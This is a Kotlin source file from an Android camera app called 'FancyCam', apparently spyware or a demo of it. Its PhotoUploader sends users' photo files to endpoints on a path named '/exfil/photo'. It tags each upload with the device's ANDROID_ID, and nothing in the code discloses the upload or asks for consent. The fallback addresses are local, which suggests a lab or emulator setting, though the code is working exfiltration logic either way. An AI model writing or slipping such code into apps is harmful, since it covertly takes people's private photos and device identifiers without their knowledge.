package com.example.fancycam.network

import com.example.fancycam.ui.AppActivityLogger
import android.content.Context
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object PhotoUploader {
    private const val TAG = "PhotoUploader"

    val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(12, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    data class UploadResult(
        val success: Boolean,
        val serverFilename: String = "",
        val message: String = "",
        val endpointUsed: String = ""
    )

    suspend fun uploadPhoto(context: Context? = null, file: File): UploadResult = withContext(Dispatchers.IO) {
        uploadPhotoSync(context, file)
    }

    fun uploadPhotoSync(context: Context? = null, file: File): UploadResult {
        if (!file.exists() || file.length() == 0L) {
            val res = UploadResult(false, message = "File does not exist or is empty")
            if (context != null) {
                AppActivityLogger.logActivity(
                    context,
                    type = "UPLOAD_FAIL",
                    title = "Photo upload failed",
                    detail = "${file.name}: File missing or empty",
                    success = false
                )
            }
            return res
        }

        val endpoints = if (context != null) {
            AppConfig.getPhotoUploadEndpoints(context)
        } else {
            listOf(
                "http://127.0.0.1:5000/exfil/photo",
                "http://10.0.2.2:5000/exfil/photo"
            )
        }

        var lastError = "Could not reach server"

        for (endpoint in endpoints) {
            try {
                Log.d(TAG, "Uploading ${file.name} (${file.length()} bytes) to $endpoint")

                val aid = if (context != null) {
                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
                } else ""

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "photo",
                        file.name,
                        file.asRequestBody("image/jpeg".toMediaType())
                    )
                    .apply {
                        if (aid.isNotEmpty()) {
                            addFormDataPart("android_id", aid)
                        }
                    }
                    .build()

                val requestBuilder = Request.Builder()
                    .url(endpoint)
                    .post(requestBody)
                    .addHeader("User-Agent", "FancyCam-Android/1.0")

                if (aid.isNotEmpty()) {
                    requestBuilder.addHeader("X-Android-ID", aid)
                }

                val request = requestBuilder.build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val body = response.body?.string().orEmpty()
                        var serverFile = ""
                        try {
                            val json = JSONObject(body)
                            serverFile = json.optString("filename", "")
                        } catch (e: Exception) {
                            Log.w(TAG, "Non-JSON response body: $body")
                        }
                        Log.i(TAG, "Photo ${file.name} successfully uploaded to $endpoint as $serverFile")

                        if (context != null) {
                            AppActivityLogger.logActivity(
                                context,
                                type = "UPLOAD_SUCCESS",
                                title = "Photo uploaded to server",
                                detail = "${file.name} -> $serverFile ($endpoint)",
                                success = true
                            )
                        }

                        return UploadResult(
                            success = true,
                            serverFilename = serverFile,
                            message = "Uploaded successfully",
                            endpointUsed = endpoint
                        )
                    } else {
                        lastError = "Server HTTP error ${response.code}"
                        Log.w(TAG, "Endpoint $endpoint responded with HTTP ${response.code}")
                    }
                }
            } catch (e: Exception) {
                lastError = e.localizedMessage ?: "Connection error"
                Log.w(TAG, "Endpoint $endpoint failed: $lastError")
            }
        }

        if (context != null) {
            AppActivityLogger.logActivity(
                context,
                type = "UPLOAD_FAIL",
                title = "Photo upload failed",
                detail = "${file.name}: $lastError",
                success = false
            )
        }

        return UploadResult(false, message = lastError)
    }
}
